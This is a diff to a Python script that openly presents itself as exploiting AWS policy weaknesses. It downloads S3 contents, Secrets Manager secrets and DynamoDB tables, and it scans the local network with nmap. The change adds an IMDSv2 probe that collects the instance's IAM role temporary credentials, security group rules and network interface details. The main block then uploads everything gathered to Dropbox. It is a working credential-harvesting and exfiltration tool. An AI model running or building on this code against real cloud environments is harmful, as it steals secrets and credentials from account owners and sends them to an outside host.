@@ -7,6 +7,8 @@ import json
 import psutil
 import ipaddress
 import nmap  # Requires: pip install python-nmap
+import requests  # NEW: for IMDSv2 calls
+from requests.exceptions import RequestException
 
 # Directories
 LOCAL_DOWNLOAD_DIR = 'upload'
@@ -129,7 +131,7 @@ def get_local_subnet():
     """Detect local subnet from active network interface."""
     for iface, addrs in psutil.net_if_addrs().items():
         for addr in addrs:
-            if addr.family.name == "AF_INET" and not addr.address.startswith("127."):
+            if getattr(addr.family, "name", "") == "AF_INET" and not addr.address.startswith("127."):
                 ip = addr.address
                 netmask = addr.netmask
                 network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
@@ -165,11 +167,193 @@ def scan_network_with_nmap(local_dir):
             f.write("\n")
     print(f"✅ Nmap results saved to {nmap_file_path}")
 
+# ------------------- NEW: IMDSv2 Probing -------------------
+
+IMDS_BASE = "http://169.254.169.254/latest"
+
+def _imds_get_token():
+    try:
+        r = requests.put(
+            f"{IMDS_BASE}/api/token",
+            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
+            timeout=2,
+        )
+        r.raise_for_status()
+        return r.text
+    except RequestException as e:
+        raise RuntimeError(f"IMDSv2 token fetch failed: {e}")
+
+def _imds_get(path, token):
+    try:
+        r = requests.get(
+            f"{IMDS_BASE}{path}",
+            headers={"X-aws-ec2-metadata-token": token},
+            timeout=2,
+        )
+        r.raise_for_status()
+        return r.text
+    except RequestException as e:
+        raise RuntimeError(f"IMDSv2 GET {path} failed: {e}")
+
+def probe_imdsv2(local_dir):
+    """
+    Query IMDSv2 for instance/role context, then use EC2 API to fetch:
+    - IAM role name + temp credentials
+    - Security group details (names + ingress/egress rules)
+    - ENI/network details incl. public IP association
+    Saves results to JSON and a human-readable TXT in `local_dir`.
+    """
+    output_json = os.path.join(local_dir, "imds_ec2_context.json")
+    output_txt  = os.path.join(local_dir, "imds_ec2_context.txt")
+
+    context = {"imds": {}, "security_groups": [], "network_interfaces": []}
+
+    try:
+        token = _imds_get_token()
+
+        # Basic instance identity
+        instance_id = _imds_get("/meta-data/instance-id", token).strip()
+        az = _imds_get("/meta-data/placement/availability-zone", token).strip()
+        sg_names = _imds_get("/meta-data/security-groups", token).strip().splitlines() if True else []
+        sg_ids = _imds_get("/meta-data/security-group-ids", token).strip().splitlines() if True else []
+
+        # IAM Role & credentials
+        role_name = ""
+        creds = {}
+        try:
+            role_name = _imds_get("/meta-data/iam/security-credentials/", token).strip().splitlines()[0]
+            creds_raw = _imds_get(f"/meta-data/iam/security-credentials/{role_name}", token)
+            creds = json.loads(creds_raw)
+        except Exception as e:
+            print(f"⚠️  Could not fetch role credentials: {e}")
+
+        # ENIs & public IPs from IMDS
+        eni_ids = []
+        try:
+            macs = _imds_get("/meta-data/network/interfaces/macs/", token).splitlines()
+            for mac in macs:
+                mac = mac.strip().strip("/")
+                if not mac:
+                    continue
+                try:
+                    eni_id = _imds_get(f"/meta-data/network/interfaces/macs/{mac}/interface-id", token).strip()
+                except Exception:
+                    eni_id = ""
+                local_ips = _imds_get(f"/meta-data/network/interfaces/macs/{mac}/local-ipv4s", token).splitlines() if True else []
+                public_ips = []
+                try:
+                    public_ips = _imds_get(f"/meta-data/network/interfaces/macs/{mac}/public-ipv4s", token).splitlines()
+                except Exception:
+                    pass
+                eni_ids.append(eni_id)
+                context["network_interfaces"].append({
+                    "mac": mac,
+                    "interface_id": eni_id,
+                    "local_ipv4s": local_ips,
+                    "public_ipv4s": public_ips,
+                })
+        except Exception as e:
+            print(f"⚠️  Could not enumerate ENIs via IMDS: {e}")
+
+        context["imds"] = {
+            "instance_id": instance_id,
+            "availability_zone": az,
+            "iam_role_name": role_name,
+            "iam_role_credentials": creds,  # NOTE: contains temporary credentials
+            "security_group_names": sg_names,
+            "security_group_ids": sg_ids,
+        }
+
+        # Enrich with EC2 API: SG rules + ENI associations
+        ec2 = boto3.client("ec2", region_name=AWS_REGION)
+
+        # Security groups (ingress/egress)
+        if sg_ids:
+            try:
+                sg_resp = ec2.describe_security_groups(GroupIds=sg_ids)
+                for sg in sg_resp.get("SecurityGroups", []):
+                    context["security_groups"].append({
+                        "group_id": sg.get("GroupId"),
+                        "group_name": sg.get("GroupName"),
+                        "description": sg.get("Description"),
+                        "vpc_id": sg.get("VpcId"),
+                        "ingress": sg.get("IpPermissions", []),
+                        "egress": sg.get("IpPermissionsEgress", []),
+                    })
+            except ClientError as e:
+                print(f"❌ describe_security_groups failed: {e}")
+
+        # ENI association & public IP details
+        if eni_ids:
+            try:
+                eni_resp = ec2.describe_network_interfaces(NetworkInterfaceIds=[eni for eni in eni_ids if eni])
+                eni_map = {eni["NetworkInterfaceId"]: eni for eni in eni_resp.get("NetworkInterfaces", [])}
+                for nic in context["network_interfaces"]:
+                    eni = eni_map.get(nic.get("interface_id"))
+                    if eni:
+                        assoc = eni.get("Association", {})
+                        nic["ec2_association"] = {
+                            "public_ip": assoc.get("PublicIp"),
+                            "public_dns_name": assoc.get("PublicDnsName"),
+                            "allocation_id": assoc.get("AllocationId"),
+                            "carrier_ip": assoc.get("CarrierIp"),
+                        }
+                        nic["subnet_id"] = eni.get("SubnetId")
+                        nic["vpc_id"] = eni.get("VpcId")
+                        nic["description"] = eni.get("Description")
+                        nic["private_dns_name"] = eni.get("PrivateDnsName")
+            except ClientError as e:
+                print(f"❌ describe_network_interfaces failed: {e}")
+
+        # Persist results
+        with open(output_json, "w") as jf:
+            json.dump(context, jf, indent=2, default=str)
+
+        # Also write a human-readable summary
+        with open(output_txt, "w") as tf:
+            tf.write(f"Instance ID: {context['imds'].get('instance_id')}\n")
+            tf.write(f"AZ: {context['imds'].get('availability_zone')}\n")
+            tf.write(f"IAM Role: {context['imds'].get('iam_role_name')}\n\n")
+
+            tf.write("Security Groups:\n")
+            for sg in context.get("security_groups", []):
+                tf.write(f"  - {sg['group_name']} ({sg['group_id']}) in {sg.get('vpc_id')}\n")
+                tf.write("    Ingress rules:\n")
+                for perm in sg.get("ingress", []):
+                    tf.write(f"      {perm}\n")
+                tf.write("    Egress rules:\n")
+                for perm in sg.get("egress", []):
+                    tf.write(f"      {perm}\n")
+                tf.write("\n")
+
+            tf.write("Network Interfaces:\n")
+            for nic in context.get("network_interfaces", []):
+                tf.write(f"  - {nic.get('interface_id')} (MAC {nic.get('mac')})\n")
+                tf.write(f"    Local IPs: {', '.join(nic.get('local_ipv4s', []))}\n")
+                tf.write(f"    Public IPs (IMDS): {', '.join(nic.get('public_ipv4s', [])) or 'None'}\n")
+                assoc = nic.get("ec2_association", {})
+                if assoc:
+                    tf.write(f"    Public IP (EC2): {assoc.get('public_ip')}\n")
+                    tf.write(f"    Public DNS: {assoc.get('public_dns_name')}\n")
+                    tf.write(f"    AllocationId: {assoc.get('allocation_id')}\n")
+                tf.write("\n")
+
+        print(f"✅ IMDS/EC2 context saved to {output_json} and {output_txt}")
+
+    except RuntimeError as e:
+        print(f"❌ IMDS probing failed: {e}")
+
 # ------------------- Main -------------------
 
 if __name__ == "__main__":
+    print(f"\n#################### Exploiting AWS S3 Bucket Policy Weaknesses ##################### \n")
     download_from_s3(LOCAL_DOWNLOAD_DIR)
+    print(f"\n#################### Exploiting AWS Secrets Manager Policy Weaknesses ##################### \n")
     list_and_save_secrets(LOCAL_DOWNLOAD_DIR)
+    print(f"\n#################### Exploiting AWS Dynamo DB Tables Policy Weaknesses ##################### \n")
     list_and_save_dynamo_tables(LOCAL_DOWNLOAD_DIR)
+    print(f"\n#################### Enumerating Local Network and live hosts ##################### \n")
     scan_network_with_nmap(LOCAL_DOWNLOAD_DIR)
+    print(f"\n#################### Probing IMDSv2 and EC2 context ##################### \n")
+    probe_imdsv2(LOCAL_DOWNLOAD_DIR)
     upload_to_dropbox(LOCAL_DOWNLOAD_DIR)
